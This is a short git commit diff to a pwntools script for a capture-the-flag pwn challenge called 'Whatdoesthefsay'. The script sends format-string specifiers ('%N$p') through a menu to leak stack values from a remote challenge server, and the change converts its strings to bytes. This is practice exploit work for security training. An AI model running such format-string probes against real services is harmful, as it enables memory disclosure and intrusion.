b5753d99e073f0f6273d1ed6a5933b43fe16b85a
szhan21 <shunda.zhang@intel.com>
2023-04-29 21:31:57 +0800

    Solving Whatdoesthefsay.

--- ctf/pwn/Whatdoesthefsay/dec.py
+++ ctf/pwn/Whatdoesthefsay/dec.py
@@ -4,13 +4,14 @@ from pwn import *
 
 def detect(io):
 	for i in range(100):
+		svar = '%'+str(i+1)+'$p'
 		io.recvuntil('2. Space food')
-		io.sendline( '1')
+		io.sendline(b'1')
 		io.recvuntil('3. Deathstar(70.00 s.rocks)')
-		io.sendline('2')
+		io.sendline(b'2')
 		io.recvuntil('Red or Green Kryptonite?')
-		io.sendline('%'+str(i+1)+'$p')
-		buf = io.recvuntil('\n').strip()
+		io.sendline(svar.encode())
+		buf = io.recvuntil('\n').decode().strip()
 		print(str(i+1)+' : '+buf)
 
 ip, port = '142.93.34.45', 30123
